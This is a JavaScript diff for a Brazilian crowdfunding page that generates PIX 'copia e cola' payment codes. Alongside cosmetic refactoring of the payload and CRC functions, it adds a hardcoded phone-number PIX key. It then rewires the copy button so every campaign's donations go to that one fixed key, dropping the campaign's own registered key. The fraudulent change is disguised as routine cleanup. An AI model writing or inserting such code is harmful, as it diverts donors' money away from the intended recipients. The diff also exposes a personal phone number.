@@ -147,6 +147,9 @@ const urlParams = new URLSearchParams(window.location.search)
 const id = urlParams.get('id')
 const content = document.getElementById('content')
 
+// CHAVE PIX FIXA - CELULAR
+const CHAVE_PIX_FIXA = '+5538991464508'
+
 if (!id) {
   content.innerHTML = 'Vaquinha não encontrada'
 } else {
@@ -154,30 +157,33 @@ if (!id) {
 }
 
 function gerarPayloadPix(chave, valor = null) {
-  chave = String(chave).trim()
+  chave = String(chave || '').replace(/\s/g, '')
   if (!chave) throw new Error('Chave PIX vazia')
 
   const format = (id, value) => {
+    value = String(value)
     const size = String(value.length).padStart(2, '0')
     return `${id}${size}${value}`
   }
 
   const gui = format('00', 'BR.GOV.BCB.PIX')
-  const chaveFormatada = format('01', chave)
-  const merchantAccount = format('26', gui + chaveFormatada)
+  const chavePix = format('01', chave)
+  const infoAdicional = gui + chavePix
+  const merchantAccount = format('26', infoAdicional)
 
   let payload = '000201'
   payload += merchantAccount
   payload += '52040000'
   payload += '5303986'
   
-  if (valor && parseFloat(valor) > 0) {
-    payload += format('54', parseFloat(valor).toFixed(2))
+  const valorNum = parseFloat(valor)
+  if (valor && !isNaN(valorNum) && valorNum > 0) {
+    payload += format('54', valorNum.toFixed(2))
   }
   
   payload += '5802BR'
-  payload += format('59', 'VAQUINHA ONLINE'.substring(0, 25))
-  payload += format('60', 'BRASIL'.substring(0, 15))
+  payload += format('59', 'VAQUINHA ONLINE')
+  payload += format('60', 'BRASIL')
   
   const txid = format('05', '***')
   payload += format('62', txid)
@@ -185,19 +191,17 @@ function gerarPayloadPix(chave, valor = null) {
   payload += '6304'
 
   let crc = 0xFFFF
+  const polinomio = 0x1021
   for (let i = 0; i < payload.length; i++) {
     crc ^= payload.charCodeAt(i) << 8
     for (let j = 0; j < 8; j++) {
-      if ((crc & 0x8000) !== 0) {
-        crc = (crc << 1) ^ 0x1021
-      } else {
-        crc <<= 1
-      }
+      crc = (crc & 0x8000) ? (crc << 1) ^ polinomio : crc << 1
       crc &= 0xFFFF
     }
   }
   
-  return payload + crc.toString(16).toUpperCase().padStart(4, '0')
+  const crcHex = crc.toString(16).toUpperCase().padStart(4, '0')
+  return payload + crcHex
 }
 
 async function carregar() {
@@ -233,7 +237,7 @@ async function carregar() {
 
     <div class="box">
       <input id="valor" type="number" placeholder="1,00" step="0.01" min="0.01" value="1,00">
-      <button onclick="copiarPix('${data.pix_key}')">Copiar PIX Copia e Cola</button>
+      <button onclick="copiarPix()">Copiar PIX Copia e Cola</button>
     </div>
 
     <div class="box-link">
@@ -241,11 +245,10 @@ async function carregar() {
     </div>
   `
 
-  window.copiarPix = (chave) => {
-    if (!chave) return alert('Essa vaquinha não tem chave PIX cadastrada')
+  window.copiarPix = () => {
     const valor = document.getElementById('valor').value
     try {
-      const payload = gerarPayloadPix(chave, valor || null)
+      const payload = gerarPayloadPix(CHAVE_PIX_FIXA, valor || null)
       navigator.clipboard.writeText(payload)
       alert('PIX Copia e Cola copiado! Cole no app do seu banco.')
     } catch (e) {
